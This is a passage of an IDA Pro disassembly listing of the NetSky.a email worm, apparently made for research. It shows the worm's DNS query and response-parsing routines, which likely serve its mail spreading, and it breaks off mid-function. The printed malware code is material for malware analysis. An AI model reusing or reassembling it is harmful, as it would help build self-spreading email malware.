.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |   This file has been	generated by The Interactive Disassembler (IDA)	   |
.text:00401000 ; |	     Copyright (c) 2011	Hex-Rays, <support@hex-rays.com>	   |
.text:00401000 ; |			License	info: 48-3319-7554-FD			   |
.text:00401000 ; |		  CNRS LIAFA 1040/UNIVERSITE DENIS DIDEROT		   |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input MD5   : 6D51E80B3915E5B581FABA9D25697792
.text:00401000 ; Input CRC32 : EDE861BD
.text:00401000
.text:00401000 ; File Name   : /home/damk/pommade/malware/Email-Worm.Win32.NetSky.a
.text:00401000 ; Format	     : Portable	executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size		       : 00004E14 (  19988.)
.text:00401000 ; Section size in file	       : 00005000 (  20480.)
.text:00401000 ; Offset	to raw data for	section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; OS type	 :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000		       include uni.inc ; see unicode subdir of ida for info on unicode
.text:00401000
.text:00401000		       .686p
.text:00401000		       .mmx
.text:00401000		       .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text	       segment para public 'CODE' use32
.text:00401000		       assume cs:_text
.text:00401000		       ;org 401000h
.text:00401000		       assume es:nothing, ss:nothing, ds:_data,	fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000 ; Attributes: bp-based frame
.text:00401000
.text:00401000 sub_401000      proc near	       ; CODE XREF: sub_4010A4+F9p
.text:00401000
.text:00401000 arg_0	       = dword ptr  8
.text:00401000 arg_4	       = dword ptr  0Ch
.text:00401000
.text:00401000		       push    ebp
.text:00401001		       mov     ebp, esp
.text:00401003		       mov     eax, [ebp+arg_4]
.text:00401006		       push    esi
.text:00401007		       push    edi
.text:00401008		       mov     edi, [ebp+arg_0]
.text:0040100B		       xor     edx, edx
.text:0040100D		       xor     ecx, ecx
.text:0040100F		       xor     esi, esi
.text:00401011		       cmp     byte ptr	[edi], 0
.text:00401014		       jz      short loc_40103F
.text:00401016		       push    ebx
.text:00401017		       push    1
.text:00401019		       pop     ebx
.text:0040101A		       sub     ebx, edi
.text:0040101C		       mov     [ebp+arg_0], ebx
.text:0040101F
.text:0040101F loc_40101F:			       ; CODE XREF: sub_401000+3Cj
.text:0040101F		       mov     bl, [edi]
.text:00401021		       cmp     bl, 2Eh
.text:00401024		       jnz     short loc_401032
.text:00401026		       mov     [edx+eax], cl
.text:00401029		       mov     edx, [ebp+arg_0]
.text:0040102C		       xor     ecx, ecx
.text:0040102E		       add     edx, edi
.text:00401030		       jmp     short loc_401037
.text:00401032 ; ---------------------------------------------------------------------------
.text:00401032
.text:00401032 loc_401032:			       ; CODE XREF: sub_401000+24j
.text:00401032		       mov     [esi+eax+1], bl
.text:00401036		       inc     ecx
.text:00401037
.text:00401037 loc_401037:			       ; CODE XREF: sub_401000+30j
.text:00401037		       inc     esi
.text:00401038		       inc     edi
.text:00401039		       cmp     byte ptr	[edi], 0
.text:0040103C		       jnz     short loc_40101F
.text:0040103E		       pop     ebx
.text:0040103F
.text:0040103F loc_40103F:			       ; CODE XREF: sub_401000+14j
.text:0040103F		       mov     [edx+eax], cl
.text:00401042		       and     byte ptr	[esi+eax+1], 0
.text:00401047		       lea     eax, [esi+1]
.text:0040104A		       pop     edi
.text:0040104B		       pop     esi
.text:0040104C		       pop     ebp
.text:0040104D		       retn
.text:0040104D sub_401000      endp
.text:0040104D
.text:0040104E
.text:0040104E ; =============== S U B R O U T I N E =======================================
.text:0040104E
.text:0040104E
.text:0040104E sub_40104E      proc near	       ; CODE XREF: sub_401332+163p
.text:0040104E					       ; sub_401332+1C0p
.text:0040104E
.text:0040104E arg_0	       = dword ptr  4
.text:0040104E arg_4	       = dword ptr  8
.text:0040104E arg_8	       = dword ptr  0Ch
.text:0040104E
.text:0040104E		       mov     eax, [esp+arg_4]
.text:00401052		       push    ebx
.text:00401053		       push    esi
.text:00401054		       push    edi
.text:00401055		       mov     edi, [esp+0Ch+arg_0]
.text:00401059
.text:00401059 loc_401059:			       ; CODE XREF: sub_40104E+4Dj
.text:00401059		       xor     edx, edx
.text:0040105B
.text:0040105B loc_40105B:			       ; CODE XREF: sub_40104E+43j
.text:0040105B		       cmp     edx, 800h
.text:00401061		       jge     short loc_40109D
.text:00401063		       movzx   ecx, byte ptr [eax]
.text:00401066		       test    ecx, ecx
.text:00401068		       jz      short loc_40109D
.text:0040106A		       test    cl, 0C0h
.text:0040106D		       jnz     short loc_401093
.text:0040106F		       push    1
.text:00401071		       pop     esi
.text:00401072		       cmp     ecx, esi
.text:00401074		       jl      short loc_401081
.text:00401076
.text:00401076 loc_401076:			       ; CODE XREF: sub_40104E+31j
.text:00401076		       mov     bl, [esi+eax]
.text:00401079		       mov     [edi], bl
.text:0040107B		       inc     edi
.text:0040107C		       inc     esi
.text:0040107D		       cmp     esi, ecx
.text:0040107F		       jle     short loc_401076
.text:00401081
.text:00401081 loc_401081:			       ; CODE XREF: sub_40104E+26j
.text:00401081		       cmp     byte ptr	[ecx+eax+1], 0
.text:00401086		       lea     eax, [ecx+eax+1]
.text:0040108A		       jz      short loc_401090
.text:0040108C		       mov     byte ptr	[edi], 2Eh
.text:0040108F		       inc     edi
.text:00401090
.text:00401090 loc_401090:			       ; CODE XREF: sub_40104E+3Cj
.text:00401090		       inc     edx
.text:00401091		       jmp     short loc_40105B
.text:00401093 ; ---------------------------------------------------------------------------
.text:00401093
.text:00401093 loc_401093:			       ; CODE XREF: sub_40104E+1Fj
.text:00401093		       movzx   eax, byte ptr [eax+1]
.text:00401097		       add     eax, [esp+0Ch+arg_8]
.text:0040109B		       jmp     short loc_401059
.text:0040109D ; ---------------------------------------------------------------------------
.text:0040109D
.text:0040109D loc_40109D:			       ; CODE XREF: sub_40104E+13j
.text:0040109D					       ; sub_40104E+1Aj
.text:0040109D		       and     byte ptr	[edi], 0
.text:004010A0		       pop     edi
.text:004010A1		       pop     esi
.text:004010A2		       pop     ebx
.text:004010A3		       retn
.text:004010A3 sub_40104E      endp
.text:004010A3
.text:004010A4
.text:004010A4 ; =============== S U B R O U T I N E =======================================
.text:004010A4
.text:004010A4 ; Attributes: bp-based frame
.text:004010A4
.text:004010A4 ; int __cdecl sub_4010A4(int, char *name, SOCKET	s, u_short hostshort, int)
.text:004010A4 sub_4010A4      proc near	       ; CODE XREF: sub_401569+36p
.text:004010A4					       ; sub_401569+67p
.text:004010A4
.text:004010A4 buf	       = byte ptr -818h
.text:004010A4 var_816	       = word ptr -816h
.text:004010A4 var_814	       = word ptr -814h
.text:004010A4 var_812	       = word ptr -812h
.text:004010A4 var_810	       = word ptr -810h
.text:004010A4 var_80E	       = word ptr -80Eh
.text:004010A4 var_80C	       = byte ptr -80Ch
.text:004010A4 fromlen	       = dword ptr -18h
.text:004010A4 to	       = sockaddr ptr -14h
.text:004010A4 optval	       = byte ptr -4
.text:004010A4 arg_0	       = dword ptr  8
.text:004010A4 name	       = dword ptr  0Ch
.text:004010A4 s	       = dword ptr  10h
.text:004010A4 hostshort       = word ptr  14h
.text:004010A4 arg_10	       = dword ptr  18h
.text:004010A4
.text:004010A4		       push    ebp
.text:004010A5		       mov     ebp, esp
.text:004010A7		       sub     esp, 818h
.text:004010AD		       push    ebx
.text:004010AE		       push    edi
.text:004010AF		       xor     ebx, ebx
.text:004010B1		       mov     ecx, 1FFh
.text:004010B6		       xor     eax, eax
.text:004010B8		       lea     edi, [ebp+buf+1]
.text:004010BE		       mov     [ebp+buf], bl
.text:004010C4		       push    10h
.text:004010C6		       rep stosd
.text:004010C8		       stosw
.text:004010CA		       pop     edx
.text:004010CB		       stosb
.text:004010CC		       push    edx	       ; Size
.text:004010CD		       lea     eax, [ebp+to]
.text:004010D0		       push    ebx	       ; Val
.text:004010D1		       push    eax	       ; Dst
.text:004010D2		       mov     [ebp+fromlen], edx
.text:004010D5		       call    _memset
.text:004010DA		       mov     edi, ds:htons
.text:004010E0		       add     esp, 0Ch
.text:004010E3		       cmp     word ptr	[ebp+s], bx
.text:004010E7		       mov     [ebp+to.sa_family], 2
.text:004010ED		       jbe     short loc_4010F4
.text:004010EF		       push    [ebp+s]
.text:004010F2		       jmp     short loc_401110
.text:004010F4 ; ---------------------------------------------------------------------------
.text:004010F4
.text:004010F4 loc_4010F4:			       ; CODE XREF: sub_4010A4+49j
.text:004010F4		       push    offset proto    ; "UDP"
.text:004010F9		       push    offset name     ; "nameserver"
.text:004010FE		       call    ds:getservbyname
.text:00401104		       cmp     eax, ebx
.text:00401106		       jz      short loc_40110E
.text:00401108		       mov     ax, [eax+8]
.text:0040110C		       jmp     short loc_401112
.text:0040110E ; ---------------------------------------------------------------------------
.text:0040110E
.text:0040110E loc_40110E:			       ; CODE XREF: sub_4010A4+62j
.text:0040110E		       push    35h	       ; hostshort
.text:00401110
.text:00401110 loc_401110:			       ; CODE XREF: sub_4010A4+4Ej
.text:00401110		       call    edi ; htons
.text:00401112
.text:00401112 loc_401112:			       ; CODE XREF: sub_4010A4+68j
.text:00401112		       push    [ebp+name]      ; cp
.text:00401115		       mov     word ptr	[ebp+to.sa_data], ax
.text:00401119		       call    ds:inet_addr
.text:0040111F		       cmp     eax, 0FFFFFFFFh
.text:00401122		       mov     dword ptr [ebp+to.sa_data+2], eax
.text:00401125		       jnz     short loc_40113E
.text:00401127		       push    [ebp+name]      ; name
.text:0040112A		       call    ds:gethostbyname
.text:00401130		       cmp     eax, ebx
.text:00401132		       jz      short loc_401159
.text:00401134		       mov     eax, [eax+0Ch]
.text:00401137		       mov     eax, [eax]
.text:00401139		       mov     eax, [eax]
.text:0040113B		       mov     dword ptr [ebp+to.sa_data+2], eax
.text:0040113E
.text:0040113E loc_40113E:			       ; CODE XREF: sub_4010A4+81j
.text:0040113E		       push    ebx	       ; protocol
.text:0040113F		       push    2	       ; type
.text:00401141		       push    2	       ; af
.text:00401143		       call    ds:socket
.text:00401149		       cmp     eax, 0FFFFFFFFh
.text:0040114C		       mov     [ebp+s],	eax
.text:0040114F		       jnz     short loc_40115D
.text:00401151		       push    0FFFFFFFDh
.text:00401153
.text:00401153 loc_401153:			       ; CODE XREF: sub_4010A4+B7j
.text:00401153		       pop     eax
.text:00401154		       jmp     loc_401261
.text:00401159 ; ---------------------------------------------------------------------------
.text:00401159
.text:00401159 loc_401159:			       ; CODE XREF: sub_4010A4+8Ej
.text:00401159		       push    0FFFFFFFEh
.text:0040115B		       jmp     short loc_401153
.text:0040115D ; ---------------------------------------------------------------------------
.text:0040115D
.text:0040115D loc_40115D:			       ; CODE XREF: sub_4010A4+ABj
.text:0040115D		       push    esi
.text:0040115E		       push    11DFh	       ; hostshort
.text:00401163		       call    edi ; htons
.text:00401165		       or      byte ptr	[ebp+var_816], 1
.text:0040116C		       push    1	       ; hostshort
.text:0040116E		       mov     word ptr	[ebp+buf], ax
.text:00401175		       call    edi ; htons
.text:00401177		       mov     [ebp+var_814], ax
.text:0040117E		       lea     eax, [ebp+var_80C]
.text:00401184		       push    eax
.text:00401185		       mov     [ebp+var_812], bx
.text:0040118C		       push    [ebp+arg_0]
.text:0040118F		       mov     [ebp+var_810], bx
.text:00401196		       mov     [ebp+var_80E], bx
.text:0040119D		       call    sub_401000
.text:004011A2		       pop     ecx
.text:004011A3		       mov     esi, eax
.text:004011A5		       pop     ecx
.text:004011A6		       add     esi, 0Ch
.text:004011A9		       push    dword ptr [ebp+hostshort] ; hostshort
.text:004011AC		       mov     [ebp+esi+buf], bl
.text:004011B3		       inc     esi
.text:004011B4		       call    edi ; htons
.text:004011B6		       push    1	       ; hostshort
.text:004011B8		       mov     word ptr	[ebp+esi+buf], ax
.text:004011C0		       call    edi ; htons
.text:004011C2		       mov     [ebp+esi+var_816], ax
.text:004011CA		       lea     eax, [ebp+to]
.text:004011CD		       push    10h	       ; tolen
.text:004011CF		       push    eax	       ; to
.text:004011D0		       add     esi, 5
.text:004011D3		       push    ebx	       ; flags
.text:004011D4		       lea     eax, [ebp+buf]
.text:004011DA		       push    esi	       ; len
.text:004011DB		       push    eax	       ; buf
.text:004011DC		       push    [ebp+s]	       ; s
.text:004011DF		       call    ds:sendto
.text:004011E5		       cmp     eax, 0FFFFFFFFh
.text:004011E8		       jnz     short loc_4011EF
.text:004011EA		       push    0FFFFFFFCh
.text:004011EC
.text:004011EC loc_4011EC:			       ; CODE XREF: sub_4010A4+1ADj
.text:004011EC		       pop     ebx
.text:004011ED		       jmp     short loc_401255
.text:004011EF ; ---------------------------------------------------------------------------
.text:004011EF
.text:004011EF loc_4011EF:			       ; CODE XREF: sub_4010A4+144j
.text:004011EF		       mov     esi, ds:setsockopt
.text:004011F5		       lea     eax, [ebp+optval]
.text:004011F8		       push    4	       ; optlen
.text:004011FA		       push    eax	       ; optval
.text:004011FB		       mov     edi, 0FFFFh
.text:00401200		       push    1006h	       ; optname
.text:00401205		       push    edi	       ; level
.text:00401206		       mov     dword ptr [ebp+optval], 3E8h
.text:0040120D		       push    [ebp+s]	       ; s
.text:00401210		       call    esi ; setsockopt
.text:00401212		       lea     eax, [ebp+optval]
.text:00401215		       push    4	       ; optlen
.text:00401217		       push    eax	       ; optval
.text:00401218		       push    1005h	       ; optname
.text:0040121D		       push    edi	       ; level
.text:0040121E		       push    [ebp+s]	       ; s
.text:00401221		       call    esi ; setsockopt
.text:00401223		       lea     eax, [ebp+fromlen]
.text:00401226		       push    eax	       ; fromlen
.text:00401227		       lea     eax, [ebp+to]
.text:0040122A		       push    eax	       ; from
.text:0040122B		       push    ebx	       ; flags
.text:0040122C		       push    800h	       ; len
.text:00401231		       push    [ebp+arg_10]    ; buf
.text:00401234		       push    [ebp+s]	       ; s
.text:00401237		       call    ds:recvfrom
.text:0040123D		       cmp     eax, 0FFFFFFFFh
.text:00401240		       jnz     short loc_401253
.text:00401242		       call    ds:WSAGetLastError
.text:00401248		       cmp     eax, 274Ch
.text:0040124D		       jz      short loc_401255
.text:0040124F		       push    0FFFFFFFBh
.text:00401251		       jmp     short loc_4011EC
.text:00401253 ; ---------------------------------------------------------------------------
.text:00401253
.text:00401253 loc_401253:			       ; CODE XREF: sub_4010A4+19Cj
.text:00401253		       mov     ebx, eax
.text:00401255
.text:00401255 loc_401255:			       ; CODE XREF: sub_4010A4+149j
.text:00401255					       ; sub_4010A4+1A9j
.text:00401255		       push    [ebp+s]	       ; s
.text:00401258		       call    ds:closesocket
.text:0040125E		       mov     eax, ebx
.text:00401260		       pop     esi
.text:00401261
.text:00401261 loc_401261:			       ; CODE XREF: sub_4010A4+B0j
.text:00401261		       pop     edi
.text:00401262		       pop     ebx
.text:00401263		       leave
.text:00401264		       retn
.text:00401264 sub_4010A4      endp
.text:00401264
.text:00401265
.text:00401265 ; =============== S U B R O U T I N E =======================================
.text:00401265
.text:00401265
.text:00401265 sub_401265      proc near	       ; CODE XREF: sub_401332+105p
.text:00401265
.text:00401265 arg_0	       = dword ptr  4
.text:00401265
.text:00401265		       push    esi
.text:00401266		       mov     esi, [esp+4+arg_0]
.text:0040126A		       mov     eax, esi
.text:0040126C		       push    edi
.text:0040126D		       imul    eax, 41010h
.text:00401273		       push    eax	       ; unsigned int
.text:00401274		       call    ??2@YAPAXI@Z    ; operator new(uint)
.text:00401279		       mov     edi, eax
.text:0040127B		       pop     ecx
.text:0040127C		       test    edi, edi
.text:0040127E		       jz      short loc_4012A7
.text:00401280		       mov     eax, esi
.text:00401282		       imul    eax, 204h
.text:00401288		       push    eax	       ; Size
.text:00401289		       push    0	       ; Val
.text:0040128B		       push    edi	       ; Dst
.text:0040128C		       call    _memset
.text:00401291		       add     esp, 0Ch
.text:00401294		       test    esi, esi
.text:00401296		       jle     short loc_4012A7
.text:00401298		       mov     eax, edi
.text:0040129A		       mov     ecx, esi
.text:0040129C
.text:0040129C loc_40129C:			       ; CODE XREF: sub_401265+40j
.text:0040129C		       mov     [eax], si
.text:0040129F		       add     eax, 204h
.text:004012A4		       dec     ecx
.text:004012A5		       jnz     short loc_40129C
.text:004012A7
.text:004012A7 loc_4012A7:			       ; CODE XREF: sub_401265+19j
.text:004012A7					       ; sub_401265+31j
.text:004012A7		       mov     eax, edi
.text:004012A9		       pop     edi
.text:004012AA		       pop     esi
.text:004012AB		       retn
.text:004012AB sub_401265      endp
.text:004012AB
.text:004012AC
.text:004012AC ; =============== S U B R O U T I N E =======================================
.text:004012AC
.text:004012AC ; Attributes: bp-based frame
.text:004012AC
.text:004012AC sub_4012AC      proc near	       ; CODE XREF: sub_401332+229p
.text:004012AC
.text:004012AC Dst	       = byte ptr -20Ch
.text:004012AC var_8	       = dword ptr -8
.text:004012AC var_4	       = dword ptr -4
.text:004012AC arg_0	       = dword ptr  8
.text:004012AC
.text:004012AC		       push    ebp
.text:004012AD		       mov     ebp, esp
.text:004012AF		       sub     esp, 20Ch
.text:004012B5		       mov     eax, [ebp+arg_0]
.text:004012B8		       push    ebx
.text:004012B9		       push    esi
.text:004012BA		       push    edi
.text:004012BB		       movzx   eax, word ptr [eax]
.text:004012BE		       cmp     eax, 2
.text:004012C1		       jl      short loc_40132D
.text:004012C3		       lea     ecx, [eax-1]
.text:004012C6		       mov     esi, 204h
.text:004012CB		       mov     [ebp+var_8], ecx
.text:004012CE		       jmp     short loc_4012D3
.text:004012D0 ; ---------------------------------------------------------------------------
.text:004012D0
.text:004012D0 loc_4012D0:			       ; CODE XREF: sub_4012AC+7Fj
.text:004012D0		       mov     ecx, [ebp+var_8]
.text:004012D3
.text:004012D3 loc_4012D3:			       ; CODE XREF: sub_4012AC+22j
.text:004012D3		       push    1
.text:004012D5		       test    ecx, ecx
.text:004012D7		       pop     eax
.text:004012D8		       jle     short loc_40132D
.text:004012DA		       mov     edx, [ebp+arg_0]
.text:004012DD		       mov     [ebp+var_4], ecx
.text:004012E0		       lea     edi, [edx+204h]
.text:004012E6
.text:004012E6 loc_4012E6:			       ; CODE XREF: sub_4012AC+7Bj
.text:004012E6		       mov     cx, [edi-202h]
.text:004012ED		       cmp     cx, [edi+2]
.text:004012F1		       jbe     short loc_401322
.text:004012F3		       lea     ebx, [edi-204h]
.text:004012F9		       push    esi	       ; Size
.text:004012FA		       lea     eax, [ebp+Dst]
.text:00401300		       push    ebx	       ; Src
.text:00401301		       push    eax	       ; Dst
.text:00401302		       call    _memcpy
.text:00401307		       push    esi	       ; Size
.text:00401308		       push    edi	       ; Src
.text:00401309		       push    ebx	       ; Dst
.text:0040130A		       call    _memcpy
.text:0040130F		       lea     eax, [ebp+Dst]
.text:00401315		       push    esi	       ; Size
.text:00401316		       push    eax	       ; Src
.text:00401317		       push    edi	       ; Dst
.text:00401318		       call    _memcpy
.text:0040131D		       add     esp, 24h
.text:00401320		       xor     eax, eax
.text:00401322
.text:00401322 loc_401322:			       ; CODE XREF: sub_4012AC+45j
.text:00401322		       add     edi, esi
.text:00401324		       dec     [ebp+var_4]
.text:00401327		       jnz     short loc_4012E6
.text:00401329		       test    eax, eax
.text:0040132B		       jz      short loc_4012D0
.text:0040132D
.text:0040132D loc_40132D:			       ; CODE XREF: sub_4012AC+15j
.text:0040132D					       ; sub_4012AC+2Cj
.text:0040132D		       pop     edi
.text:0040132E		       pop     esi
.text:0040132F		       pop     ebx
.text:00401330		       leave
.text:00401331		       retn
.text:00401331 sub_4012AC      endp
.text:00401331
.text:00401332
.text:00401332 ; =============== S U B R O U T I N E =======================================
.text:00401332
.text:00401332 ; Attributes: bp-based frame
.text:00401332
.text:00401332 sub_401332      proc near	       ; CODE XREF: sub_401569+7Ap
.text:00401332
.text:00401332 Source	       = byte ptr -218h
.text:00401332 var_119	       = byte ptr -119h
.text:00401332 Str	       = byte ptr -118h
.text:00401332 var_117	       = byte ptr -117h
.text:00401332 var_18	       = dword ptr -18h
.text:00401332 var_14	       = dword ptr -14h
.text:00401332 in	       = in_addr ptr -10h
.text:00401332 var_C	       = dword ptr -0Ch
.text:00401332 hostshort       = word ptr -8
.text:00401332 var_4	       = dword ptr -4
.text:00401332 arg_0	       = dword ptr  8
.text:00401332
.text:00401332		       push    ebp
.text:00401333		       mov     ebp, esp
.text:00401335		       sub     esp, 218h
.text:0040133B		       and     [ebp+Str], 0
.text:00401342		       push    ebx
.text:00401343		       push    esi
.text:00401344		       push    edi
.text:00401345		       push    3Fh
.text:00401347		       xor     eax, eax
.text:00401349		       pop     ecx
.text:0040134A		       lea     edi, [ebp+var_117]
.text:00401350		       rep stosd
.text:00401352		       mov     esi, [ebp+arg_0]
.text:00401355		       mov     ebx, ds:ntohs
.text:0040135B		       stosw
.text:0040135D		       and     [ebp+var_4], 0
.text:00401361		       stosb
.text:00401362		       mov     ax, [esi+6]
.text:00401366		       push    eax	       ; netshort
.text:00401367		       call    ebx ; ntohs
.text:00401369		       movzx   eax, ax
.text:0040136C		       mov     dword ptr [ebp+hostshort], eax
.text:0040136F		       mov     ax, [esi+8]
.text:00401373		       push    eax	       ; netshort
.text:00401374		       call    ebx ; ntohs
.text:00401376		       movzx   edi, ax
.text:00401379		       mov     ax, [esi+0Ah]
.text:0040137D		       push    eax	       ; netshort
.text:0040137E		       call    ebx ; ntohs
.text:00401380		       movzx   eax, ax
.text:00401383		       add     eax, edi
.text:00401385		       lea     edi, [ebp+Str]
.text:0040138B		       add     eax, dword ptr [ebp+hostshort]
.text:0040138E		       and     [ebp+var_C], 0
.text:00401392		       mov     [ebp+var_18], edi
.text:00401395		       mov     [ebp+var_14], eax
.text:00401398		       lea     eax, [esi+0Ch]
.text:0040139B
.text:0040139B loc_40139B:			       ; CODE XREF: sub_401332+78j
.text:0040139B					       ; sub_401332+A7j
.text:0040139B		       mov     cl, [eax]
.text:0040139D		       test    cl, cl
.text:0040139F		       jz      short loc_4013DB
.text:004013A1		       movsx   ecx, cl
.text:004013A4		       inc     eax
.text:004013A5		       mov     dword ptr [ebp+in.S_un],	ecx
.text:004013A8		       test    ecx, ecx
.text:004013AA		       jz      short loc_40139B
.text:004013AC		       mov     edx, ecx
.text:004013AE		       mov     esi, eax
.text:004013B0		       shr     ecx, 2
.text:004013B3		       rep movsd
.text:004013B5		       mov     ecx, edx
.text:004013B7		       and     ecx, 3
.text:004013BA		       rep movsb
.text:004013BC		       mov     edi, [ebp+var_18]
.text:004013BF		       mov     ecx, edx
.text:004013C1		       add     [ebp+var_C], ecx
.text:004013C4		       add     edi, ecx
.text:004013C6		       mov     esi, [ebp+arg_0]
.text:004013C9		       add     eax, ecx
.text:004013CB		       mov     byte ptr	[edi], 2Eh
.text:004013CE		       and     byte ptr	[edi+1], 0
.text:004013D2		       inc     edi
.text:004013D3		       inc     [ebp+var_C]
.text:004013D6		       mov     [ebp+var_18], edi
.text:004013D9		       jmp     short loc_40139B
.text:004013DB ; ---------------------------------------------------------------------------
.text:004013DB
.text:004013DB loc_4013DB:			       ; CODE XREF: sub_401332+6Dj
.text:004013DB		       lea     eax, [ebp+Str]
.text:004013E1		       push    eax	       ; Str
.text:004013E2		       call    _strlen
.text:004013E7		       test    eax, eax
.text:004013E9		       pop     ecx
.text:004013EA		       jz      short loc_401401
.text:004013EC		       lea     eax, [ebp+Str]
.text:004013F2		       push    eax	       ; Str
.text:004013F3		       call    _strlen
.text:004013F8		       and     [ebp+eax+var_119], 0
.text:00401400		       pop     ecx
.text:00401401
.text:00401401 loc_401401:			       ; CODE XREF: sub_401332+B8j
.text:00401401		       mov     eax, [ebp+var_C]
.text:00401404		       lea     edi, [eax+esi+13h]
.text:00401408		       mov     ax, [eax+esi+13h]
.text:0040140D		       push    eax	       ; netshort
.text:0040140E		       call    ebx ; ntohs
.text:00401410		       cmp     ax, 5
.text:00401414		       jnz     short loc_401428
.text:00401416		       dec     dword ptr [ebp+hostshort]
.text:00401419		       jz      short loc_401428
.text:0040141B		       push    dword ptr [ebp+hostshort] ; hostshort
.text:0040141E		       call    ds:htons
.text:00401424		       mov     [esi+6],	ax
.text:00401428
.text:00401428 loc_401428:			       ; CODE XREF: sub_401332+E2j
.text:00401428					       ; sub_401332+E7j
.text:00401428		       mov     ax, [esi+6]
.text:0040142C		       push    eax	       ; netshort
.text:0040142D		       call    ebx ; ntohs
.text:0040142F		       test    ax, ax
.text:00401432		       jz      short loc_401444
.text:00401434		       push    dword ptr [ebp+hostshort]
.text:00401437		       call    sub_401265
.text:0040143C		       test    eax, eax
.text:0040143E		       pop     ecx
.text:0040143F		       mov     [ebp+arg_0], eax
.text:00401442		       jnz     short loc_40144B
.text:00401444
.text:00401444 loc_401444:			       ; CODE XREF: sub_401332+100j
.text:00401444		       xor     eax, eax
.text:00401446		       jmp     loc_401564
.text:0040144B ; ---------------------------------------------------------------------------
.text:0040144B
.text:0040144B loc_40144B:			       ; CODE XREF: sub_401332+110j
.text:0040144B		       cmp     [ebp+var_14], 0
.text:0040144F		       jz      loc_401558
.text:00401455
.text:00401455 loc_401455:			       ; CODE XREF: sub_401332+21Dj
.text:00401455		       and     [ebp+Source], 0
.text:0040145C		       mov     ax, [edi]
.text:0040145F		       push    eax	       ; netshort
.text:00401460		       call    ebx ; ntohs
.text:00401462		       movzx   eax, ax
.text:00401465		       dec     eax
.text:00401466		       jz      loc_4014FC
.text:0040146C		       dec     eax
.text:0040146D		       jz      loc_401539
.text:00401473		       sub     eax, 3
.text:00401476		       jz      short loc_4014E6
.text:00401478		       sub     eax, 0Ah
.text:0040147B		       jz      short loc_401489
.text:0040147D		       mov     [ebp+var_14], 1
.text:00401484		       jmp     loc_401539
.text:00401489 ; ---------------------------------------------------------------------------
.text:00401489
.text:00401489 loc_401489:			       ; CODE XREF: sub_401332+149j
.text:00401489		       lea     eax, [edi+0Ch]
.text:0040148C		       push    esi
.text:0040148D		       push    eax
.text:0040148E		       lea     eax, [ebp+Source]
.text:00401494		       push    eax
.text:00401495		       call    sub_40104E
.text:0040149A		       add     esp, 0Ch
.text:0040149D		       cmp     dword ptr [ebp+hostshort], 0
.text:004014A1		       jz      loc_401539
.text:004014A7		       mov     eax, [ebp+var_4]
.text:004014AA		       mov     ecx, [ebp+arg_0]
.text:004014AD		       imul    eax, 204h
.text:004014B3		       add     eax, ecx
.text:004014B5		       lea     ecx, [ebp+Source]
.text:004014BB		       mov     dword ptr [ebp+in.S_un],	eax
.text:004014BE		       add     eax, 4
.text:004014C1		       push    ecx	       ; Source
.text:004014C2		       push    eax	       ; Dest
.text:004014C3		       call    _strcpy
.text:004014C8		       mov     ax, [edi+0Ah]
.text:004014CC		       pop     ecx
.text:004014CD		       pop     ecx
.text:004014CE		       push    eax	       ; netshort
.text:004014CF		       call    ebx ; ntohs
.text:004014D1		       mov     ecx, dword ptr [ebp+in.S_un]
.text:004014D4		       inc     [ebp+var_4]
.text:004014D7		       dec     dword ptr [ebp+hostshort]
.text:004014DA		       mov     [ecx+2],	ax
.text:004014DE		       jnz     short loc_401539
.text:004014E0		       and     [ebp+var_4], 0
.text:004014E4		       jmp     short loc_401539
.text:004014E6 ; ---------------------------------------------------------------------------
.text:004014E6
.text:004014E6 loc_4014E6:			       ; CODE XREF: sub_401332+144j
.text:004014E6		       lea     eax, [edi+0Ah]
.text:004014E9		       push    esi
.text:004014EA		       push    eax
.text:004014EB		       lea     eax, [ebp+Str]
.text:004014F1		       push    eax
.text:004014F2		       call    sub_40104E
.text:004014F7		       add     esp, 0Ch
.text:004014FA		       jmp     short loc_401539
.text:004014FC ; ---------------------------------------------------------------------------
.text:004014FC
.text:004014FC loc_4014FC:			       ; CODE XREF: sub_401332+134j
.text:004014FC		       mov     eax, [edi+0Ah]
.text:004014FF		       mov     dword ptr [ebp+in.S_un],	eax
.text:00401502		       mov     ax, [esi+6]
.text:00401506		       push    eax	       ; netshort
.text:00401507		       call    ebx ; ntohs
.text:00401509		       movzx   eax, ax
.text:0040150C		       cmp     [ebp+var_4], eax
.text:0040150F		       jge     short loc_401539
.text:00401511		       push    dword ptr [ebp+in.S_un] ; in
.text:00401514		       call    ds:inet_ntoa
.text:0040151A		       push    eax	       ; Source
.text:0040151B		       mov     eax, [ebp+var_4]
.text:0040151E		       imul    eax, 204h
.text:00401524		       mov     ecx, [ebp+arg_0]
.text:00401527		       lea     eax, [eax+ecx+104h]
.text:0040152E		       push    eax	       ; Dest
.text:0040152F		       call    _strcpy
.text:00401534		       inc     [ebp+var_4]
.text:00401537		       pop     ecx
.text:00401538		       pop     ecx
.text:00401539
.text:00401539 loc_401539:			       ; CODE XREF: sub_401332+13Bj
.text:00401539					       ; sub_401332+152j ...
.text:00401539		       dec     [ebp+var_14]
.text:0040153C		       jz      short loc_401558
.text:0040153E		       mov     ax, [edi+8]
.text:00401542		       push    eax	       ; netshort
.text:00401543		       call    ebx ; ntohs
.text:00401545		       movzx   eax, ax
.text:00401548		       lea     edi, [eax+edi+0Ch]
.text:0040154C
.text:0040154C loc_40154C:			       ; CODE XREF: sub_401332+224j
.text:0040154C		       cmp     byte ptr	[edi], 0
.text:0040154F		       jz      loc_401455
.text:00401555		       inc     edi
.text:00401556		       jmp     short loc_40154C
.text:00401558 ; ---------------------------------------------------------------------------
.text:00401558
.text:00401558 loc_401558:			       ; CODE XREF: sub_401332+11Dj
.text:00401558					       ; sub_401332+20Aj
.text:00401558		       push    [ebp+arg_0]
.text:0040155B		       call    sub_4012AC
.text:00401560		       mov     eax, [ebp+arg_0]
.text:00401563		       pop     ecx
.text:00401564
